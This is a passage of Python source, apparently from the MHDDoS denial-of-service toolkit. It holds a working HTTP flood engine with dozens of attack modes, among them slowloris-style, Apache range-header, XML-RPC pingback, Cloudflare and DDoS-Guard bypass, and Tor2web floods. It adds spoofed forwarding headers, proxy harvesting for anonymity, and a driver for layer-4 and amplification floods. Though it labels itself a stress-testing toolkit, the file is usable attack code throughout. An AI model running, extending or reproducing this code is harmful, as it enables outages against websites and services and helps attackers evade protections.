        user_agents: Optional[set[str]] = None,
        referers: Optional[set[str]] = None,
        proxies: Optional[set[Proxy]] = None,
    ):
        super().__init__(event)
        self._target = target
        self._rpc = rpc
        self._proxies = list(proxies or ())
        self._user_agents = list(user_agents or DEFAULT_USER_AGENTS)
        self._referers = list(referers or DEFAULT_REFERERS)

        port = target.port or (443 if target.scheme.lower() == "https" else 80)
        self._raw_target = (host, port)
        self._req_type = self._request_method(method)
        self._default_payload = (
            f"{self._req_type} {target.raw_path_qs} HTTP/{choice(['1.0', '1.1'])}\r\n"
        )
        self._payload = (
            self._default_payload + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
        )
        self._send = getattr(self, self.METHOD_NAMES.get(method, "_get"))

    @staticmethod
    def _request_method(method: str) -> str:
        upper = method.upper()
        if upper in HttpFlood.GET_METHODS:
            return "GET"
        if upper in HttpFlood.POST_METHODS:
            return "POST"
        if upper in HttpFlood.HEAD_METHODS:
            return "HEAD"
        return "GET"

    @property
    def _spoof_ip(self) -> str:
        spoof = ProxyTools.Random.rand_ipv4()
        return (
            "X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
            f"Via: {spoof}\r\n"
            f"Client-IP: {spoof}\r\n"
            f"X-Forwarded-For: {spoof}\r\n"
            f"Real-IP: {spoof}\r\n"
        )

    @property
    def _random_headers(self) -> str:
        return (
            f"User-Agent: {choice(self._user_agents)}\r\n"
            f"Referrer: {choice(self._referers)}{quote(self._target.human_repr())}\r\n"
            + self._spoof_ip
        )

    def _build_payload(self, extra: str = "") -> bytes:
        return (
            self._payload
            + f"Host: {self._target.authority}\r\n"
            + self._random_headers
            + extra
            + "\r\n"
        ).encode()

    def _open_connection(self, address: Optional[tuple[str, int]] = None) -> socket:
        if self._proxies:
            sock = choice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)
        connected = False
        try:
            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            sock.settimeout(0.9)
            sock.connect(address or self._raw_target)
            if self._target.scheme.lower() == "https":
                server_hostname = address[0] if address else self._target.host
                sock = _wrap_tls(sock, server_hostname)
            connected = True
        finally:
            if not connected:
                Tools.safe_close(sock)
        return sock

    def _send_payload(self, payload: bytes, repeats: Optional[int] = None) -> None:
        with self._open_connection() as sock:
            for _ in range(self._rpc if repeats is None else repeats):
                if not self._is_running():
                    break
                Tools.send(sock, payload)

    def _get(self) -> None:
        self._send_payload(self._build_payload())

    def _post(self) -> None:
        body = f'{{"data": {ProxyTools.Random.rand_str(32)}}}'
        self._send_payload(
            self._build_payload(
                f"Content-Length: {len(body)}\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n" + body
            )[:-2]
        )

    def _stress(self) -> None:
        body = f'{{"data": {ProxyTools.Random.rand_str(512)}}}'
        self._send_payload(
            self._build_payload(
                f"Content-Length: {len(body)}\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n" + body
            )[:-2]
        )

    def _cookies(self) -> None:
        self._send_payload(
            self._build_payload(
                "Cookie: _ga=GA%s; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n"
                % (
                    ProxyTools.Random.rand_int(1000, 99999),
                    ProxyTools.Random.rand_str(6),
                    ProxyTools.Random.rand_str(32),
                )
            )
        )

    def _apache(self) -> None:
        self._send_payload(
            self._build_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
        )

    def _xmlrpc(self) -> None:
        body = (
            "<?xml version='1.0' encoding='iso-8859-1'?>"
            "<methodCall><methodName>pingback.ping</methodName>"
            "<params><param><value><string>%s</string></value>"
            "</param><param><value><string>%s</string>"
            "</value></param></params></methodCall>"
            % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
        )
        self._send_payload(
            self._build_payload(
                f"Content-Length: {len(body)}\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n\r\n" + body
            )[:-2]
        )

    def _pps(self) -> None:
        self._send_payload(
            (self._default_payload + f"Host: {self._target.authority}\r\n\r\n").encode()
        )

    def _killer(self) -> None:
        while self._is_running():
            Thread(target=self._run_guarded, args=(self._get,), daemon=True).start()
            sleep(0.01)

    def _bot(self) -> None:
        host = self._target.raw_authority
        first = (
            "GET /robots.txt HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            f"User-Agent: {choice(SEARCH_ENGINE_AGENTS)}\r\n"
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"
        ).encode()
        second = (
            "GET /sitemap.xml HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            f"User-Agent: {choice(SEARCH_ENGINE_AGENTS)}\r\n"
            "Accept-Encoding: gzip,deflate,br\r\n"
            f"If-None-Match: {ProxyTools.Random.rand_str(9)}-{ProxyTools.Random.rand_str(4)}\r\n"
            "If-Modified-Since: Sun, 26 Sep 2099 06:00:00 GMT\r\n\r\n"
        ).encode()
        payload = self._build_payload()
        with self._open_connection() as sock:
            Tools.send(sock, first)
            Tools.send(sock, second)
            for _ in range(self._rpc):
                Tools.send(sock, payload)

    def _even(self) -> None:
        payload = self._build_payload()
        with self._open_connection() as sock:
            while Tools.send(sock, payload) and sock.recv(1) and self._is_running():
                pass

    def _ovh(self) -> None:
        self._send_payload(self._build_payload(), repeats=min(self._rpc, 5))

    @staticmethod
    def _http_get(session: Session, url: str, proxy: Optional[dict]) -> None:
        kwargs = {"proxies": proxy} if proxy else {}
        with session.get(url, **kwargs) as response:
            REQUESTS_SENT.add(1)
            BYTES_SEND.add(Tools.size_of_request(response))

    def _cfb(self) -> None:
        proxy = choice(self._proxies).asRequest() if self._proxies else None
        with create_scraper() as session:
            for _ in range(self._rpc):
                self._http_get(session, self._target.human_repr(), proxy)

    def _bypass(self) -> None:
        proxy = choice(self._proxies).asRequest() if self._proxies else None
        with Session() as session:
            for _ in range(self._rpc):
                self._http_get(session, self._target.human_repr(), proxy)

    def _cfbuam(self) -> None:
        payload = self._build_payload()
        with self._open_connection() as sock:
            Tools.send(sock, payload)
            sleep(5.01)
            started = time()
            for _ in range(self._rpc):
                if not self._is_running():
                    break
                Tools.send(sock, payload)
                if time() > started + 120:
                    break

    def _avb(self) -> None:
        payload = self._build_payload()
        with self._open_connection() as sock:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(sock, payload)

    def _dgb(self) -> None:
        proxy = choice(self._proxies) if self._proxies else None
        proxy_request = proxy.asRequest() if proxy else None
        attempts = min(self._rpc, 5)

        session = Tools.dgb_solver(
            self._target.human_repr(), choice(self._user_agents), proxy_request
        )
        try:
            for _ in range(attempts):
                sleep(attempts / 100)
                self._http_get(session, self._target.human_repr(), proxy_request)
        finally:
            Tools.safe_close(session)

    def _dyn(self) -> None:
        payload = (
            self._payload
            + f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
            + self._random_headers
            + "\r\n"
        ).encode()
        self._send_payload(payload)

    def _downloader(self) -> None:
        payload = self._build_payload()
        with self._open_connection() as sock:
            for _ in range(self._rpc):
                Tools.send(sock, payload)
                while self._is_running():
                    sleep(0.01)
                    if not sock.recv(1):
                        break
            if self._is_running():
                Tools.send(sock, b"0")

    def _gsb(self) -> None:
        with self._open_connection() as sock:
            for _ in range(self._rpc):
                path = self._target.raw_path_qs
                separator = "&" if "?" in path else "?"
                payload = (
                    f"{self._req_type} {path}{separator}qs={ProxyTools.Random.rand_str(6)} "
                    f"HTTP/1.1\r\n"
                    f"Host: {self._target.authority}\r\n"
                    + self._random_headers
                    + "Accept-Encoding: gzip, deflate, br\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Cache-Control: max-age=0\r\n"
                    "Connection: Keep-Alive\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "Sec-Gpc: 1\r\n"
                    "Pragma: no-cache\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n\r\n"
                ).encode()
                Tools.send(sock, payload)

    def _rhex(self) -> None:
        random_hex = os.urandom(choice([32, 64, 128])).hex()
        payload = (
            f"{self._req_type} {self._target.authority}/{random_hex} HTTP/1.1\r\n"
            f"Host: {self._target.authority}/{random_hex}\r\n"
            + self._random_headers
            + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        ).encode()
        self._send_payload(payload)

    def _stomp(self) -> None:
        dep = (
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        hex_header = (
            r"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87"
            r"\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F"
            r"\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F"
            r"\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84"
            r"\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F"
            r"\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98"
            r"\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98"
            r"\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B"
            r"\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99"
            r"\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C"
            r"\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA "
        )
        first = (
            f"{self._req_type} {self._target.authority}/{hex_header} HTTP/1.1\r\n"
            f"Host: {self._target.authority}/{hex_header}\r\n" + self._random_headers + dep
        ).encode()
        second = (
            f"{self._req_type} {self._target.authority}/cdn-cgi/l/chk_captcha HTTP/1.1\r\n"
            f"Host: {hex_header}\r\n" + self._random_headers + dep
        ).encode()
        with self._open_connection() as sock:
            Tools.send(sock, first)
            for _ in range(self._rpc):
                Tools.send(sock, second)

    def _null(self) -> None:
        payload = (
            self._payload + f"Host: {self._target.authority}\r\n"
            "User-Agent: null\r\n"
            "Referrer: null\r\n" + self._spoof_ip + "\r\n"
        ).encode()
        self._send_payload(payload)

    def _slow(self) -> None:
        payload = self._build_payload()
        with self._open_connection() as sock:
            for _ in range(self._rpc):
                Tools.send(sock, payload)
            while Tools.send(sock, payload) and sock.recv(1) and self._is_running():
                for _ in range(self._rpc):
                    keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
                    Tools.send(sock, keep)
                    sleep(self._rpc / 15)
                    break

    def _tor(self) -> None:
        provider = "." + choice(TOR2WEB)
        host = self._target.host.replace(".onion", provider)
        payload = (
            self._payload
            + f"Host: {self._target.authority.replace('.onion', provider)}\r\n"
            + self._random_headers
            + "\r\n"
        ).encode()
        with self._open_connection((host, self._raw_target[1])) as sock:
            for _ in range(self._rpc):
                Tools.send(sock, payload)


class ProxyManager:
    @staticmethod
    def download_from_config(config: dict, proxy_type: int) -> set[Proxy]:
        providers = [
            provider
            for provider in config.get("proxy-providers", [])
            if isinstance(provider, dict)
            and (proxy_type == 0 or provider.get("type") == proxy_type)
        ]
        if not providers:
            logger.warning("No proxy providers configured for type %s", proxy_type)
            return set()

        logger.info("Downloading proxies from %d providers", len(providers))
        proxies: set[Proxy] = set()
        with ThreadPoolExecutor(max_workers=len(providers)) as executor:
            futures = []
            for provider in providers:
                try:
                    provider_type = ProxyType.stringToProxyType(str(provider["type"]))
                except (KeyError, ValueError) as exc:
                    logger.error("Invalid proxy provider %r: %s", provider, exc)
                    continue
                futures.append(executor.submit(ProxyManager.download, provider, provider_type))
            for future in as_completed(futures):
                proxies.update(future.result())
        return proxies

    @staticmethod
    def download(provider: dict, proxy_type: ProxyType) -> set[Proxy]:
        url = provider.get("url")
        if not url:
            logger.error("Proxy provider has no URL: %r", provider)
            return set()
        timeout = provider.get("timeout", 5)
        logger.debug(
            "Downloading proxies from %s (type=%s, timeout=%s)", url, proxy_type.name, timeout
        )
        try:
            with get(url, timeout=timeout) as response:
                lines = response.text.splitlines()
            return set(ProxyUtiles.parseAllIPPort(lines, proxy_type))
        except (OSError, ValueError, TypeError, RequestException) as exc:
            logger.error("Download proxy error (%s): %s", url, exc)
            return set()


def load_proxies(
    config: dict, proxy_file: Path, proxy_type: int, threads: int, url: Optional[URL] = None
) -> Optional[set[Proxy]]:
    if proxy_type not in VALID_PROXY_TYPES:
        die(f"Socks type not found [4, 5, 1, 0, 6], got {proxy_type}")
    if proxy_type == 6:
        proxy_type = choice([4, 5, 1])

    if not proxy_file.exists():
        logger.warning(
            "Proxy file %s doesn't exist, creating it and downloading proxies.", proxy_file
        )
        try:
            proxies = ProxyManager.download_from_config(config, proxy_type)
        except (OSError, RuntimeError, ValueError, RequestException) as exc:
            die(f"Proxy download failed: {exc}")
        logger.info("%d proxies are being checked, this may take a while", len(proxies))
        try:
            proxies = ProxyChecker.checkAll(
                proxies,
                timeout=5,
                threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )
        except (OSError, RuntimeError, ValueError, RequestException) as exc:
            die(f"Proxy check failed: {exc}")
        if not proxies:
            die(
                "Proxy check failed. Your network may be the problem"
                " | The target may not be available."
            )
        try:
            proxy_file.parent.mkdir(parents=True, exist_ok=True)
            proxy_file.write_text(
                "\n".join(str(proxy) for proxy in proxies) + "\n", encoding="utf-8"
            )
        except OSError as exc:
            die(f"Cannot write proxy file {proxy_file}: {exc}")

    try:
        proxies = ProxyUtiles.readFromFile(proxy_file)
    except (OSError, ValueError) as exc:
        die(f"Cannot read proxy file {proxy_file}: {exc}")
    if not proxies:
        logger.info("Empty proxy file, running flood without proxies")
        return None
    logger.info("Proxy count: %d", len(proxies))
    return proxies


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def check_raw_socket() -> bool:
        with suppress(OSError), socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
            return True
        return False

    @staticmethod
    def run_console() -> None:
        prompt = f"{gethostname()}@MHTools:~#"
        while True:
            try:
                raw = input(f"{prompt} ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not raw:
                continue

            command = raw.split(" ", 1)[0].upper()
            if command == "HELP":
                print("Tools: " + ", ".join(sorted(ToolsConsole.METHODS)))
                print("Commands: HELP, CLEAR, BACK, EXIT")
            elif command in EXIT_WORDS:
                return
            elif command == "CLEAR":
                print("\033c", end="")
            elif command not in ToolsConsole.METHODS:
                print(f"{command} command not found")
            elif command == "DSTAT":
                ToolsConsole.dstat()
            elif command in {"CFIP", "DNS"}:
                print("Soon")
            elif command == "CHECK":
                ToolsConsole.check(prompt)
            elif command == "INFO":
                ToolsConsole.info_command(prompt)
            elif command == "TSSRV":
                ToolsConsole.tssrv_command(prompt)
            elif command == "PING":
                ToolsConsole.ping_command(prompt)

    @staticmethod
    def stop() -> None:
        """Kill other MHDDoS processes started from this repository."""
        print("All attacks have been stopped!")
        current = Process()
        protected = {current.pid}
        with suppress(PsutilError, OSError):
            protected.update(parent.pid for parent in current.parents())
        for proc in process_iter(["pid", "name", "cmdline"]):
            if proc.info["pid"] in protected:
                continue
            process_name = (proc.info.get("name") or "").lower()
            if not process_name.startswith("python"):
                continue
            cmdline = proc.info.get("cmdline") or []
            if not any(ToolsConsole._is_same_script(part) for part in cmdline):
                continue
            with suppress(PsutilError, OSError):
                proc.kill()

    @staticmethod
    def _is_same_script(value: str) -> bool:
        with suppress(OSError, RuntimeError, ValueError):
            return Path(value).resolve() == SCRIPT_FILE
        return False

    @staticmethod
    def usage() -> None:
        layer4 = ", ".join(sorted(Methods.LAYER4_METHODS))
        layer7 = ", ".join(sorted(Methods.LAYER7_METHODS))
        tools = ", ".join(sorted(ToolsConsole.METHODS))
        script = SCRIPT_NAME
        total = len(Methods.ALL_METHODS) + len(ToolsConsole.METHODS) + 4
        print(f"""* MHDDoS {__version__} - stress-testing toolkit with {total} methods
Note: If the proxy list is empty, the attack runs without proxies.
      If the proxy file doesn't exist, proxies are downloaded and checked.
      Proxy Type 0 = all providers in config.json
      Socks types: 6 = random, 5 = SOCKS5, 4 = SOCKS4, 1 = HTTP, 0 = all

> Methods:
 - Layer 4 ({len(Methods.LAYER4_METHODS)}): {layer4}
 - Layer 7 ({len(Methods.LAYER7_METHODS)}): {layer7}
 - Tools ({len(ToolsConsole.METHODS)}): {tools}
 - Commands (4): HELP, STOP, TOOLS, WEB

Example:
   L7: python3 {script} GET https://example.com 0 100 http.txt 10 60
   L4: python3 {script} UDP 1.2.3.4:80 100 60
   L4 proxied: python3 {script} TCP 1.2.3.4:80 100 60 5 socks5.txt
   L4 amplification: python3 {script} DNS 1.2.3.4:80 100 60 dns.txt
""")

    @staticmethod
    def _prompt_lines(prompt: str, label: str = "give-me-ipaddress") -> Iterator[str]:
        while True:
            try:
                value = input(f"{prompt}{label}# ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not value:
                continue
            upper = value.upper()
            if upper == "BACK":
                return
            if upper == "CLEAR":
                print("\033c", end="")
                continue
            if upper in EXIT_WORDS:
                raise SystemExit(0)
            yield value

    @staticmethod
    def dstat() -> None:
        previous = net_io_counters(pernic=False)
        try:
            while True:
                sleep(1)
                current = net_io_counters(pernic=False)
                delta = [current[index] - previous[index] for index in range(len(current))]
                previous = current
                logger.info(
                    "Bytes Sent %s\nBytes Received %s\nPackets Sent %s\n"
                    "Packets Received %s\nErrIn %s\nErrOut %s\nDropIn %s\nDropOut %s\n"
                    "Cpu Usage %s%%\nMemory %s%%",
                    Tools.human_bytes(delta[0]),
                    Tools.human_bytes(delta[1]),
                    Tools.human_format(delta[2]),
                    Tools.human_format(delta[3]),
                    delta[4],
                    delta[5],
                    delta[6],
                    delta[7],
                    cpu_percent(),
                    virtual_memory().percent,
                )
        except KeyboardInterrupt:
            return

    @staticmethod
    def check(prompt: str) -> None:
        for value in ToolsConsole._prompt_lines(prompt):
            url = value if value.startswith(("http://", "https://")) else "http://" + value
            logger.info("please wait ...")
            with suppress(OSError, RequestException, ValueError), get(url, timeout=20) as response:
                logger.info(
                    "status_code: %d\nstatus: %s",
                    response.status_code,
                    "ONLINE" if response.status_code <= 500 else "OFFLINE",
                )

    @staticmethod
    def info_command(prompt: str) -> None:
        for value in ToolsConsole._prompt_lines(prompt):
            domain = host_only(value)
            print("please wait ...", end="\r")
            info = ToolsConsole.info(domain)
            if not info.get("success"):
                print("Error!")
                continue
            logger.info(
                "Country: %s\nCity: %s\nOrg: %s\nIsp: %s\nRegion: %s",
                info.get("country"),
                info.get("city"),
                info.get("org"),
                info.get("isp"),
                info.get("region"),
            )

    @staticmethod
    def tssrv_command(prompt: str) -> None:
        for value in ToolsConsole._prompt_lines(prompt, "give-me-domain"):
            domain = host_only(value)
            print("please wait ...", end="\r")
            info = ToolsConsole.ts_srv(domain)
            logger.info("TCP: %s", info["_tsdns._tcp."])
            logger.info("UDP: %s", info["_ts3._udp."])

    @staticmethod
    def ping_command(prompt: str) -> None:
        for value in ToolsConsole._prompt_lines(prompt):
            domain = host_only(value)
            logger.info("please wait ...")
            try:
                result = ping(domain, count=5, interval=0.2)
            except (OSError, ICMPLibError) as exc:
                logger.error("Ping failed: %s", exc)
                continue
            logger.info(
                "Address: %s\nPing: %.2f\nAccepted Packets: %d/%d\nstatus: %s",
                result.address,
                result.avg_rtt,
                result.packets_received,
                result.packets_sent,
                "ONLINE" if result.is_alive else "OFFLINE",
            )

    @staticmethod
    def ts_srv(domain: str) -> dict[str, str]:
        dns_resolver = resolver.Resolver()
        dns_resolver.timeout = 1
        dns_resolver.lifetime = 1
        info = {}
        for record in ["_ts3._udp.", "_tsdns._tcp."]:
            try:
                for srv in dns_resolver.resolve(record + domain, "SRV"):
                    info[record] = f"{str(srv.target).rstrip('.')}:{srv.port}"
            except (DNSException, OSError):
                info[record] = "Not found"
        return info

    @staticmethod
    def info(domain: str) -> dict:
        with (
            suppress(OSError, RequestException, ValueError),
            get(f"https://ipwhois.app/json/{domain}/", timeout=20) as response,
        ):
            return response.json()
        return {"success": False}


RAW_SOCKET_METHODS = Methods.LAYER4_AMP | {"SYN", "ICMP", "OVH-UDP"}


def start_workers(factory: Callable[[], FloodWorker], count: int) -> int:
    """Start ``count`` workers, tolerating thread-limit errors."""
    started = 0
    for _ in range(count):
        try:
            factory().start()
            started += 1
        except (OSError, RuntimeError) as exc:
            logger.error("Cannot start worker thread: %s", exc)
            break
    if not started:
        die("Could not start any worker threads (check ulimit/thread limits).")
    if started < count:
        logger.warning("Started %d of %d worker threads", started, count)
    return started


class CommandParser(argparse.ArgumentParser):
    """ArgumentParser that reports validation errors through the logger."""

    def error(self, message: str) -> Never:
        die(message)


def positive_int(value: str) -> int:
    try:
        number = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"invalid integer: {value!r}") from exc
    if number < 1:
        raise argparse.ArgumentTypeError("must be at least 1")
    return number


def parse_layer7_args(args: list[str]) -> tuple[int, int, str, int, int, bool]:
    parser = CommandParser(add_help=False, prog=f"{SCRIPT_NAME} <method> <url>")
    parser.add_argument("socks_type", type=int)
    parser.add_argument("threads", type=positive_int)
    parser.add_argument("proxy_list")
    parser.add_argument("rpc", type=positive_int)
    parser.add_argument("duration", type=positive_int)
    parser.add_argument("debug", nargs="?")
    namespace = parser.parse_args(args)
    return (
        namespace.socks_type,
        namespace.threads,
        namespace.proxy_list,
        namespace.rpc,
        namespace.duration,
        namespace.debug is not None,
    )


def parse_layer4_args(args: list[str]) -> tuple[int, int, list[str]]:
    parser = CommandParser(add_help=False, prog=f"{SCRIPT_NAME} <method> <ip:port>")
    parser.add_argument("threads", type=positive_int)
    parser.add_argument("duration", type=positive_int)
    namespace, extra = parser.parse_known_args(args)
    return namespace.threads, namespace.duration, [item.strip() for item in extra]


def run_layer7(target: str, args: list[str], config: dict, method: str) -> None:
    raw_url = target.strip()
    if not raw_url:
        die("Target is required")
    if not raw_url.startswith(("http://", "https://")):
        raw_url = "http://" + raw_url
    try:
        url = URL(raw_url)
    except ValueError as exc:
        die(f"Invalid target URL: {exc}")
    if not url.host:
        die(f"Invalid target URL: {target!r}")

    host = url.host if method == "TOR" else resolve_host(url.host)
    socks_type, threads, proxy_list, rpc, duration, debug = parse_layer7_args(args)

    proxy_name = filename_arg(proxy_list, "Proxy list")
    proxy_file = PROXY_DIR / proxy_name

    if debug:
        logger.setLevel("DEBUG")

    user_agents = read_wordlist(USER_AGENT_FILE, "useragent")
    referers = read_wordlist(REFERER_FILE, "referer")

    if threads > 1000:
        logger.warning("Thread count is higher than 1000")

    if rpc > 100:
        logger.warning("RPC (requests per connection) is higher than 100")

    proxies = load_proxies(config, proxy_file, socks_type, threads, url)
    event = Event()
    started = start_workers(
        lambda: HttpFlood(
            url,
            host,
            method,
            rpc=rpc,
            event=event,
            user_agents=user_agents,
            referers=referers,
            proxies=proxies,
        ),
        threads,
    )

    port = url.port or (443 if url.scheme.lower() == "https" else 80)
    wait_for_attack(event, url.host, port, method, duration, started)


def run_layer4(target: str, args: list[str], config: dict, method: str) -> None:
    threads, duration, extra = parse_layer4_args(args)

    raw_target = target.strip()
    if not raw_target:
        die("Target is required")
    if "://" not in raw_target:
        raw_target = "http://" + raw_target
    try:
        url = URL(raw_target)
    except ValueError as exc:
        die(f"Invalid target: {exc}")
    if not url.host:
        die(f"Invalid target: {target!r}")

    port = url.port or 80
    if not 1 <= port <= 65535:
        die("Invalid port [min: 1 / max: 65535]")
    host = resolve_host(url.host)

    try:
        protocol_id = int(config.get("MINECRAFT_DEFAULT_PROTOCOL", 74))
    except (TypeError, ValueError):
        protocol_id = 74

    ref = None
    proxies = None
    proxy_type = None
    if extra:
        try:
            proxy_type = int(extra[0])
        except ValueError:
            proxy_type = None

    if method in Methods.LAYER4_AMP:
        if not extra:
            die(f"{method} requires a reflector file (for example: DNS 1.2.3.4:80 100 60 dns.txt)")
        if len(extra) > 2:
            die(f"Too many arguments for {method}")
        ref = read_reflectors(BASE_DIR / "files" / filename_arg(extra[0], "Reflector"))
        if len(extra) > 1:
            logger.setLevel("DEBUG")
    elif proxy_type is not None:
        if len(extra) < 2:
            die("Proxy type provided without a proxy list file")
        if len(extra) > 3:
            die("Too many Layer 4 arguments")
        if method not in Layer4.PROXY_METHODS:
            die(f"{method} cannot use a Layer 4 proxy list")
        proxy_name = filename_arg(extra[1], "Proxy list")
        proxies = load_proxies(config, PROXY_DIR / proxy_name, proxy_type, threads)
        if len(extra) > 2:
            logger.setLevel("DEBUG")
    elif extra:
        if len(extra) > 1:
            die("Too many Layer 4 arguments")
        logger.setLevel("DEBUG")

    if method in RAW_SOCKET_METHODS and not ToolsConsole.check_raw_socket():
        die("Cannot create a raw socket (run as root or grant NET_RAW)")

    if method in Methods.LAYER4_AMP:
        logger.warning("This method needs spoofable servers, please check")
        logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")

    if method == "MCBOT":
        protocol_id = detect_minecraft_protocol(host, port, protocol_id)
        REQUESTS_SENT.reset()
        BYTES_SEND.reset()

    event = Event()
    started = start_workers(
        lambda: Layer4(
            (host, port),
            method,
            event,
            ref=ref,
            proxies=proxies,
            protocol_id=protocol_id,
            mcbot_prefix=config.get("MCBOT", "MHDDoS_"),
        ),
        threads,
    )

    wait_for_attack(event, host, port, method, duration, started)


def wait_for_attack(
    event: Event, target: str, port: int, method: str, duration: int, threads: int
) -> None:
    logger.info(
        "%sAttack started to %s with %s method for %s seconds, threads: %d%s",
        Color.WARNING,
        target,
        method,
        duration,
        threads,
        Color.RESET,
    )
    event.set()
    started = time()
    while True:
        elapsed = time() - started
        if elapsed >= duration:
            break
        logger.debug(
            "Target: %s, Port: %s, Method: %s, PPS: %s, BPS: %s / %.2f%%",
            target,
            port,
            method,
            Tools.human_format(int(REQUESTS_SENT)),
            Tools.human_bytes(int(BYTES_SEND)),
            elapsed / duration * 100,
        )
        REQUESTS_SENT.reset()
        BYTES_SEND.reset()
        sleep(1)
    event.clear()
    logger.info("%sAttack finished.%s", Color.GREEN, Color.RESET)


def main(args: list[str]) -> None:
    if not args:
        ToolsConsole.usage()
        return

    command = args[0].upper()
    if command in {"HELP", "-H", "--HELP", "-?"}:
        ToolsConsole.usage()
        return
    if command in {"VERSION", "-V", "--VERSION"}:
        print(f"MHDDoS {__version__}")
        return
    if command == "TOOLS":
        ToolsConsole.run_console()
        return
    if command == "WEB":
        run_web_panel()
        return
    if command == "STOP":
        ToolsConsole.stop()
        return
    if command not in Methods.ALL_METHODS:
        die(f"Method not found: {command}\nAvailable: {', '.join(sorted(Methods.ALL_METHODS))}")
    if len(args) < 2 or not args[1].strip():
        die("Target is required")

    target = args[1]
    if target == "@stdin":
        target = sys.stdin.readline().strip()
        if not target:
            die("Target is required")
    params = args[2:]
    config = load_config()
    if command in Methods.LAYER7_METHODS:
        run_layer7(target, params, config, command)
    else:
        run_layer4(target, params, config, command)


if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print()
